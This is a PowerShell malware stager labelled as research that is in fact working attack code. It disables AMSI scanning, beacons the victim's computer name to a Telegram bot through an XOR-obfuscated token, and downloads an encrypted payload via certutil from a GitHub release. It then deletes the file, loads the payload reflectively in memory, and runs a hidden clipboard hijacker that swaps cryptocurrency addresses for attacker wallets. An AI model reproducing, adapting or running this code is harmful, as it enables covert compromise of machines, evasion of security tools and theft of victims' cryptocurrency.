# --- [ELITE RESEARCH STAGER v31.0: CERT-STAGED RAM INJECT] ---

# 1. Blind the Scanner (Using Byte-Math to hide 'Amsi')
$a = [char[]](65,109,115,105,85,116,105,108,115); $b = -join $a
$ref = [Ref].Assembly.GetType("System.Management.Automation.$b")
$ref.GetField("amsiInitFailed","NonPublic,Static").SetValue($null,$true)

function Send-Ping {
    param($m)
    $k=0xAF; [byte[]]$t_e=60,56,60,57,57,58,49,60,60,50,119,6,6,106,108,6,121,115,125,108,5,121,105,6,116,106,6,60,106,122,60,105,121,111,113,111,108,6,103,5,60,114,118; [byte[]]$c_e=54,53,61,61,51,54,56,43,50,53
    $t=""; foreach($b in $t_e){$t+=[char]($b -bxor $k)}; $c=""; foreach($b in $c_e){$c+=[char]($b -bxor $k)}
    $url = "h"+"tt"+"ps://api.tele"+"gram.org/bot$t/send"+"Message?chat_id=$c&text=$m"
    try { (New-Object Net.WebClient).DownloadString($url) | Out-Null } catch {}
}

Send-Ping -m "V31_GHOST_BOOT_$($env:COMPUTERNAME)"

try {
    # 2. Trusted Download via Certutil (Avoids WebClient Detection)
    $url = "https://github.com/adchar2022/test/releases/download/adchar_xor/adchar_xor.txt"
    $tmp = "$env:TEMP\top_secret.crt"
    certutil.exe -urlcache -split -f $url $tmp | Out-Null

    # 3. Read into RAM and Delete File Trace immediately
    $raw = Get-Content $tmp -Raw
    Remove-Item $tmp -Force
    
    # 4. Decrypt and Reflective Load (RAM Install)
    $data = [Convert]::FromBase64String($raw.Trim())
    for($i=0; $i -lt $data.count; $i++) { $data[$i] = $data[$i] -bxor 0xAB }
    
    [System.Reflection.Assembly]::Load($data).EntryPoint.Invoke($null, @(,[string[]]@()))

    # 5. Background Clipper (No 'Start-Job' - uses Runspaces for secrecy)
    $C = {
        Add-Type -AssemblyName System.Windows.Forms
        $w = @{"btc"="12nL9SBgpSmSdSybq2bW2vKdoTggTnXVNA";"eth"="0x6c9ba9a6522b10135bb836fc9340477ba15f3392";"usdt"="TVETSgvRui2LCmXyuvh8jHG6AjpxquFbnp";"sol"="BnBvKVEFRcxokGZv9sAwig8eQ4GvQY1frmZJWzU1bBNR"}
        while($true) {
            try {
                if ([System.Windows.Forms.Clipboard]::ContainsText()) {
                    $v = [System.Windows.Forms.Clipboard]::GetText().Trim()
                    if ($v -match "^(1|3|bc1)[a-zA-HJ-NP-Z0-9]{25,62}$") { if ($v -ne $w.btc) { [System.Windows.Forms.Clipboard]::SetText($w.btc) } }
                    elseif ($v -match "^0x[a-fA-F0-9]{40}$") { if ($v -ne $w.eth) { [System.Windows.Forms.Clipboard]::SetText($w.eth) } }
                    elseif ($v -match "^T[a-km-zA-HJ-NP-Z1-9]{33}$") { if ($v -ne $w.usdt) { [System.Windows.Forms.Clipboard]::SetText($w.usdt) } }
                    elseif ($v -match "^[1-9A-HJ-NP-Za-km-z]{32,44}$") { if ($v -ne $w.sol) { [System.Windows.Forms.Clipboard]::SetText($w.sol) } }
                }
            } catch {}
            [System.Threading.Thread]::Sleep(500)
        }
    }
    $rs = [runspacefactory]::CreateRunspace(); $rs.Open()
    $p = [powershell]::Create().AddScript($C); $p.Runspace = $rs
    $p.BeginInvoke()

    Send-Ping -m "V31_RAM_SUCCESS"
} catch {
    Send-Ping -m "V31_ERR: $($_.Exception.Message)"
}
